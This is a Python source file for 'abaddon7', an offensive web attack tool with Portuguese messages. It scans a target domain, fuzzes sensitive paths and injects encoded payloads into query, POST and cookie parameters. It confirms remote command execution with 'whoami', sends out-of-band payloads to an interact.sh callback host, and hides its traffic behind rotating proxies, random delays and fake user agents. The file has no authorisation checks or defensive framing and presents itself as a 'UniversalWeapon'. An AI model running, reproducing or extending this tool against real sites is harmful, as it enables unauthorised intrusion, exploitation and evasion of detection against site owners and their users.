#!/usr/bin/env python3
# abaddon7.py – Recon + Fuzz + Bypass + Deep Exploit + Shell + Stealth
# pip install requests faker tldextract dnspython bs4 lxml

import os, sys, time, json, random, socket, hashlib, base64, threading, re, concurrent.futures
import requests, tldextract
from urllib.parse import urlparse, urljoin, parse_qs
from bs4 import BeautifulSoup
from faker import Faker
fake = Faker()

ROOT_DIR = os.path.expanduser("~/.abaddon7")
os.makedirs(ROOT_DIR, exist_ok=True)
PAYLOADS_FILE = os.path.join(os.path.dirname(__file__), "payloads.json")
with open(PAYLOADS_FILE) as f:
    PAYLOADS = json.load(f)

LOG_FILE = os.path.join(ROOT_DIR, "abaddon7.log")
REPORT_FILE = os.path.join(ROOT_DIR, "report.html")
OOB_DOMAIN = "tfktpiqtdervuisxlzgr03o6otp655wk8.oast.fun"  # Configure seu interact.sh
COOKIE = None  # Defina via --cookie "SESSIONID=xxx"

def log(msg):
    ts = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

PROXY_FILE = os.path.join(os.path.dirname(__file__), "proxies.txt")
PROXIES = []
try:
    with open(PROXY_FILE, 'r') as f:
        proxies_from_file = [line.strip() for line in f if line.strip()]
        PROXIES = [f"http://{p}" for p in proxies_from_file]
    if PROXIES:
        log(f"[+] {len(PROXIES )} proxies carregados de {PROXY_FILE}")
    else:
        log("[-] Arquivo de proxies está vazio. Nenhuma proxy será usada.")
except FileNotFoundError:
    log("[-] Arquivo proxies.txt não encontrado. Nenhuma proxy será usada.")

HEADERS = {"User-Agent": fake.user_agent()}
DELAY = (1.0, 3.5)

def rand_delay():
    time.sleep(random.uniform(*DELAY))

def rotate_proxy():
    return {"http": random.choice(PROXIES ), "https": random.choice(PROXIES )} if PROXIES else None

def retry_get(url, **kw):
    if COOKIE:
        kw.setdefault("headers", {}).update({"Cookie": COOKIE})
    for i in range(3):
        try:
            kw.setdefault("headers", {}).update(HEADERS)
            kw.setdefault("timeout", 10)
            if PROXIES:
                kw.setdefault("proxies", rotate_proxy())
            rand_delay()
            return requests.get(url, **kw)
        except Exception as e:
            log(f"Retry {i+1} para {url}: {e}")
            time.sleep(2**i)
    return None

def encode_payload(payload):
    encoders = [
        lambda x: x,
        lambda x: x.replace("'", "%27").replace('"', "%22"),
        lambda x: base64.b64encode(x.encode()).decode(),
        lambda x: "".join(f"%{ord(c):02x}" for c in x),
        lambda x: x.replace(" ", "/**/"),
        lambda x: x.upper(),
        lambda x: x.lower(),
        lambda x: x.replace("(", "/*!50000("),
    ]
    return random.choice(encoders)(payload)

def get_baseline(url, **kw):
    return retry_get(url, **kw)

def detect_diff(baseline, response):
    if not baseline or not response:
        return False
    return hashlib.md5(baseline.text.encode()).hexdigest() != hashlib.md5(response.text.encode()).hexdigest()

def detect_time(url, **kw):
    start = time.time()
    retry_get(url, **kw)
    elapsed = time.time() - start
    return elapsed > 4.5

def detect_oob(payload):
    return OOB_DOMAIN.lower() in payload.lower()

def detect_reflection(response, payload):
    return payload in response.text

def fingerprint_tech(url):
    tech = []
    r = retry_get(url)
    if not r:
        return tech
    headers = r.headers
    text_lower = r.text.lower()
    if "wp-" in text_lower or "wordpress" in text_lower:
        tech.append("WordPress")
    if "joomla" in text_lower:
        tech.append("Joomla")
    if "drupal" in text_lower:
        tech.append("Drupal")
    if "X-Powered-By" in headers:
        tech.append(headers["X-Powered-By"])
    if "Server" in headers:
        tech.append(headers["Server"])
    return list(set(tech))

def crawl_links(url):
    links = set()
    r = retry_get(url)
    if not r:
        return links
    soup = BeautifulSoup(r.text, "lxml")
    for a in soup.find_all("a", href=True):
        try:
            href = urljoin(url, a["href"])
            if urlparse(href).netloc == urlparse(url).netloc:
                links.add(href.split('#')[0])
        except Exception:
            pass
    return links

def fuzz_dirs(url):
    wordlist = ["/admin", "/login", "/upload", "/backup", "/config", "/test", "/dev", "/api", "/wp-admin", "/.env", "/dashboard"]
    found = []
    base_url = url.rstrip('/')
    for path in wordlist:
        full_url = f"{base_url}{path}"
        r = retry_get(full_url)
        if r and r.status_code in [200, 403]:
            found.append(full_url)
    return found

def post_exploit(vuln_type, url, param, payload, place="query"):
    results = {}
    log(f"  [>>] Tentando pós-exploração para {vuln_type.upper()}...")
    try:
        if vuln_type == "rce":
            cmd_payload = payload.replace("id", "whoami").replace("sleep 5", "whoami")
            attack_kw = {}
            if place == "query":
                attack_kw['params'] = {param: cmd_payload}
            elif place == "post":
                attack_kw['data'] = {param: cmd_payload}
            
            if attack_kw:
                r = retry_get(url, **attack_kw)
                if r and r.text:
                    results["data"] = r.text.strip().split('\n')[0]
                    log(f"    [+] RCE confirmado. Usuário: {results['data']}")
    except Exception as e:
        log(f"    [-] Falha na pós-exploração: {e}")
    return results

# =============================================================
#           INÍCIO DA CLASSE Exploit CORRIGIDA
# =============================================================
class Exploit:
    @staticmethod
    def test(url, param, place="query"):
        log(f"  [*] Testando URL: {url} | Parâmetro: {param} | Local: {place}")
        
        for vuln_type, payloads in PAYLOADS.items():
            for category, plist in payloads.items():
                for raw in plist:
                    payload = encode_payload(raw.format(oob_domain=OOB_DOMAIN))
                    try:
                        baseline_kw = {place: {param: "abaddon_test"}} if place != "header" else {"headers": {param: "abaddon_test"}}
                        baseline = get_baseline(url, **baseline_kw)

                        attack_kw = {}
                        if place == "query":
                            attack_kw['params'] = {param: payload}
                        elif place == "post":
                            attack_kw['data'] = {param: payload}
                        elif place == "cookie":
                            attack_kw['cookies'] = {param: payload}
                        elif place == "header":
                            attack_kw['headers'] = {param: payload}
                        else:
                            continue
                        
                        confirmed = False
                        
                        if category == "time":
                            if detect_time(url, **attack_kw):
                                confirmed = True
                        else:
                            r = retry_get(url, **attack_kw)
                            
                            if category == "oob":
                                if detect_oob(payload):
                                    log(f"  [?] Payload OOB enviado para {url}. Verifique seu servidor Interact.sh!")
                            elif category == "reflected" and r and detect_reflection(r, payload):
                                confirmed = True
                            elif category in ["error", "basic"] and detect_diff(baseline, r):
                                confirmed = True

                        if confirmed:
                            log(f"[!] VULNERABILIDADE ENCONTRADA: {vuln_type.upper()} ({category}) em {url} via {place}:{param}")
                            post_exploit_results = post_exploit(vuln_type, url, param, payload, place)
                            return {"url": url, "vuln": vuln_type, "param": param, "payload": raw, "results": post_exploit_results}
                    except Exception as e:
                        log(f"  [-] Erro durante teste de {vuln_type} com payload '{raw}': {e}")
                        pass
        return None
# =============================================================
#           FIM DA CLASSE Exploit CORRIGIDA
# =============================================================

class UniversalWeapon:
    def __init__(self, domain):
        self.domain = domain.replace("https://", "" ).replace("http://", "" ).split('/')[0]
        self.results = []
        self.scanned_urls = set()

    def scan_target(self, url):
        if url in self.scanned_urls:
            return
        self.scanned_urls.add(url)
        
        log(f"[+] Escaneando: {url}")
        tech = fingerprint_tech(url)
        if tech:
            log(f"  [>] Tecnologias detectadas: {', '.join(tech)}")
        
        params_to_test = set(["id", "search", "q", "page", "file", "view", "name", "email", "return"])
        try:
            query_params = parse_qs(urlparse(url).query)
            for p in query_params:
                params_to_test.add(p)
        except Exception:
            pass

        for param in params_to_test:
            for place in ["query", "post", "cookie"]:
                res = Exploit.test(url, param, place)
                if res:
                    self.results.append(res)
                    break 

    def start(self):
        log(f"Iniciando Abaddon7 contra {self.domain}")
        
        initial_subdomains = [self.domain, f"www.{self.domain}", f"admin.{self.domain}", f"api.{self.domain}", f"dev.{self.domain}"]
        urls_to_scan = {f"http://{sub}" for sub in initial_subdomains}
        
        log("[*] Fase de Reconhecimento Inicial..." )
        crawled_links = set()
        fuzzed_dirs = set()
        for url in list(urls_to_scan):
            crawled_links.update(crawl_links(url))
            fuzzed_dirs.update(fuzz_dirs(url))
        
        urls_to_scan.update(crawled_links)
        urls_to_scan.update(fuzzed_dirs)

        log(f"[*] Total de {len(urls_to_scan)} URLs para escanear.")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            executor.map(self.scan_target, list(urls_to_scan))
            
        self.generate_report()
        log("Operação finalizada.")

    def generate_report(self):
        if not self.results:
            log("[-] Nenhuma vulnerabilidade encontrada.")
            return

        html = f"""
        <html>
        <head>
            <title>Abaddon7 Report - {self.domain}</title>
            <style>
                body {{ font-family: sans-serif; margin: 2em; }}
                table {{ border-collapse: collapse; width: 100%; }}
                th, td {{ border: 1px solid #dddddd; text-align: left; padding: 8px; }}
                th {{ background-color: #f2f2f2; }}
                tr:nth-child(even) {{ background-color: #f9f9f9; }}
                h1 {{ color: #c0392b; }}
            </style>
        </head>
        <body>
        <h1>Relatório de Vulnerabilidades - {self.domain}</h1>
        <p>Total de vulnerabilidades encontradas: {len(self.results)}</p>
        <table border="1">
        <tr><th>URL</th><th>Vulnerabilidade</th><th>Parâmetro</th><th>Payload Usado</th><th>Dados Extraídos</th></tr>
        """
        for r in self.results:
            data_str = json.dumps(r.get('results', {}))
            html += f"<tr><td>{r['url']}</td><td>{r['vuln']}</td><td>{r['param']}</td><td>{r['payload']}</td><td>{data_str}</td></tr>"
        html += "</table></body></html>"
        
        with open(REPORT_FILE, "w") as f:
            f.write(html)
        log(f"[+] Relatório salvo em {REPORT_FILE}")

if __name__ == "__main__":
    args = sys.argv[1:]
    domain_arg = None
    
    i = 0
    while i < len(args):
        if args[i] == '--cookie':
            if i + 1 < len(args):
                COOKIE = args[i+1]
                log(f"[*] Usando cookie de sessão: {COOKIE}")
                i += 2
            else:
                print("Erro: O argumento --cookie precisa de um valor.")
                sys.exit(1)
        elif not args[i].startswith('--'):
            domain_arg = args[i]
            i += 1
        else:
            i += 1
            
    if not domain_arg:
        print("Uso: python3 abaddon7.py <dominio> [--cookie \"NOME=VALOR\"]")
        sys.exit(1)
        
    UniversalWeapon(domain_arg).start()
